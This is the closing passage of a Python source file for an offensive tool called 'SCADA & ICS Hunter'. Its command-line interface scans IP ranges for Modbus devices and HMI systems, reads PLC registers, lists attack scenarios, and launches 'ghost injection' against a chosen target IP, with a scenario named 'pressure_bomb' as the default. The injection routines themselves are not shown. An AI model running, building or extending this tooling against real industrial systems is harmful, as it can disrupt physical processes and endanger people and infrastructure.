                "screenshots_captured": len(self.hmi_screenshotter.captured_screenshots),
                "is_scanning": self.hmi_screenshotter.is_scanning
            },
            "warning": "⚠️ EXTREME CAUTION: Industrial systems control physical processes!"
        }
    
    def get_ics_protocols(self) -> List[Dict]:
        """Get list of supported ICS protocols"""
        return [
            {"id": p.value[0], "name": p.name, "port": p.value[1]}
            for p in ICSProtocol
        ]
    
    def get_plc_vendors(self) -> List[str]:
        """Get list of known PLC vendors"""
        return [v.value for v in PLCVendor]


# =============================================================================
# FACTORY FUNCTION
# =============================================================================

_instance: Optional[SCADAICSHunter] = None

def get_scada_ics_hunter() -> SCADAICSHunter:
    """Get or create the SCADA ICS Hunter instance"""
    global _instance
    if _instance is None:
        _instance = SCADAICSHunter()
    return _instance


# =============================================================================
# CLI INTERFACE
# =============================================================================

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="SCADA & ICS Hunter")
    parser.add_argument("--scan-modbus", type=str, help="Scan for Modbus devices (IP range)")
    parser.add_argument("--scan-hmi", type=str, help="Scan for HMI systems (IP range)")
    parser.add_argument("--read-registers", type=str, help="Read registers from PLC (IP)")
    parser.add_argument("--scenarios", action="store_true", help="List attack scenarios")
    parser.add_argument("--inject", type=str, help="Start ghost injection (IP)")
    parser.add_argument("--scenario", type=str, default="pressure_bomb", help="Attack scenario")
    
    args = parser.parse_args()
    
    hunter = get_scada_ics_hunter()
    
    if args.scan_modbus:
        print(f"Scanning for Modbus devices: {args.scan_modbus}")
        devices = hunter.modbus_injector.scan_network(args.scan_modbus)
        for d in devices:
            print(f"  Found: {d.ip}:{d.port} - {d.vendor}")
    
    elif args.scan_hmi:
        print(f"Scanning for HMI systems: {args.scan_hmi}")
        hmis = hunter.hmi_screenshotter.scan_for_hmis(args.scan_hmi)
        for h in hmis:
            print(f"  Found: {h['ip']}:{h['port']} - {h.get('banner', 'Unknown')}")
    
    elif args.read_registers:
        print(f"Reading registers from: {args.read_registers}")
        registers = hunter.modbus_injector.read_registers(args.read_registers)
        for addr, val in registers.items():
            print(f"  Register {addr}: {val}")
    
    elif args.scenarios:
        print("Available attack scenarios:")
        for name, scenario in hunter.modbus_injector.ATTACK_SCENARIOS.items():
            print(f"  {name}: {scenario['description']}")
    
    elif args.inject:
        print(f"Starting ghost injection on {args.inject} with scenario: {args.scenario}")
        result = hunter.modbus_injector.start_ghost_injection(args.inject, args.scenario)
        print(json.dumps(result, indent=2, default=str))
    
    else:
        status = hunter.get_status()
        print(json.dumps(status, indent=2))
